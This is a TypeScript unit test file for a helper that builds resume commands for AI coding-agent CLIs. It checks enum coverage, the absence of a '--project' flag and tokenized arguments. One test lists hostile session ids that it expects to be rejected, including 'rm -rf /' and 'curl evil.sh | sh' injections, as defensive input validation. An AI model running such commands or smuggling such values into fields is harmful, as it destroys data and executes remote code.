/**
 * agent-resume-descriptor Unit Tests
 *
 * The `--project` assertions below guard a shipped bug: the sessions dropdown
 * used to offer `claude --resume <id> --project <path>`, which fails when
 * pasted because no supported agent accepts that flag.
 *
 * The exhaustive enum sweep follows the LESSONS.md rule about adding enum
 * members: a new AgentType must fail this suite rather than silently resolving
 * to a wrong binary.
 */

import { describe, it, expect } from 'vitest';
import {
  buildAgentResumeDescriptor,
  supportsSessionResume,
} from '@/domain/shared/agent-resume-descriptor.js';
import { AgentType } from '@/domain/generated/output.js';

const CWD = '/Users/dev/project';
const SESSION_ID = '3f1a9c40-1d2b-4e77-9c11-2a5b6d8e0f34';

/** Every AgentType, with the binary expected for resume (null = unsupported). */
const EXPECTED_BINARIES: Record<AgentType, string | null> = {
  [AgentType.ClaudeCode]: 'claude',
  [AgentType.CodexCli]: 'codex',
  [AgentType.Cursor]: 'cursor-agent',
  [AgentType.CopilotCli]: null,
  [AgentType.GeminiCli]: null,
  [AgentType.Aider]: null,
  [AgentType.Continue]: null,
  [AgentType.Cline]: null,
  [AgentType.OpenRouter]: null,
  [AgentType.TogetherAi]: null,
  [AgentType.Ollama]: null,
  [AgentType.Dev]: null,
};

describe('buildAgentResumeDescriptor', () => {
  it('covers every AgentType member, so new members fail loudly', () => {
    // If AgentType gains a member, this assertion fails until EXPECTED_BINARIES
    // is updated — a deliberate tripwire.
    expect(Object.keys(EXPECTED_BINARIES).sort()).toEqual(Object.values(AgentType).sort());
  });

  for (const [agentType, expectedBinary] of Object.entries(EXPECTED_BINARIES)) {
    if (expectedBinary === null) {
      it(`returns null for the unsupported agent type "${agentType}"`, () => {
        expect(buildAgentResumeDescriptor(agentType, SESSION_ID, CWD)).toBeNull();
        expect(supportsSessionResume(agentType)).toBe(false);
      });
      continue;
    }

    it(`builds "${expectedBinary} --resume <id>" for "${agentType}"`, () => {
      const descriptor = buildAgentResumeDescriptor(agentType, SESSION_ID, CWD);

      expect(descriptor).not.toBeNull();
      expect(descriptor?.binary).toBe(expectedBinary);
      expect(descriptor?.args).toEqual(['--resume', SESSION_ID]);
      expect(descriptor?.cwd).toBe(CWD);
      expect(supportsSessionResume(agentType)).toBe(true);
    });
  }

  it('never emits a --project argument for any agent type', () => {
    for (const agentType of Object.values(AgentType)) {
      const descriptor = buildAgentResumeDescriptor(agentType, SESSION_ID, CWD);
      if (descriptor === null) continue;

      expect(descriptor.args).not.toContain('--project');
      expect(descriptor.displayCommand).not.toContain('--project');
    }
  });

  it('never places the cwd in the arguments — the working directory carries it', () => {
    const descriptor = buildAgentResumeDescriptor(AgentType.ClaudeCode, SESSION_ID, CWD);

    expect(descriptor?.args).not.toContain(CWD);
    expect(descriptor?.displayCommand).not.toContain(CWD);
  });

  it('returns args as a tokenized array, not a shell string', () => {
    const descriptor = buildAgentResumeDescriptor(AgentType.ClaudeCode, SESSION_ID, CWD);

    expect(Array.isArray(descriptor?.args)).toBe(true);
    expect(descriptor?.args).toHaveLength(2);
  });

  it('returns null for an unknown agent type string', () => {
    expect(buildAgentResumeDescriptor('not-a-real-agent', SESSION_ID, CWD)).toBeNull();
  });

  it('returns null when the session id is empty', () => {
    expect(buildAgentResumeDescriptor(AgentType.ClaudeCode, '', CWD)).toBeNull();
  });

  it.each([
    'id; rm -rf /',
    'id && curl evil.sh | sh',
    'id`whoami`',
    'id$(whoami)',
    'id|tee /tmp/x',
    'id with spaces',
    'id\nsecond-line',
    'id>out.txt',
  ])('rejects the shell-unsafe session id %j', (unsafeId) => {
    // The embedded terminal writes this into a shell, and ids come from
    // filenames on disk — so reject metacharacters rather than escaping them.
    expect(buildAgentResumeDescriptor(AgentType.ClaudeCode, unsafeId, CWD)).toBeNull();
  });

  it('accepts the id shapes providers actually use', () => {
    for (const id of [
      '3f1a9c40-1d2b-4e77-9c11-2a5b6d8e0f34',
      'session_001',
      'rollout-2026.08.03-abc',
    ]) {
      expect(buildAgentResumeDescriptor(AgentType.ClaudeCode, id, CWD)).not.toBeNull();
    }
  });

  it('returns null when the cwd is empty', () => {
    expect(buildAgentResumeDescriptor(AgentType.ClaudeCode, SESSION_ID, '')).toBeNull();
  });

  it('exposes a display command that is safe to copy into a terminal', () => {
    const descriptor = buildAgentResumeDescriptor(AgentType.Cursor, SESSION_ID, CWD);

    expect(descriptor?.displayCommand).toBe(`cursor-agent --resume ${SESSION_ID}`);
  });
});
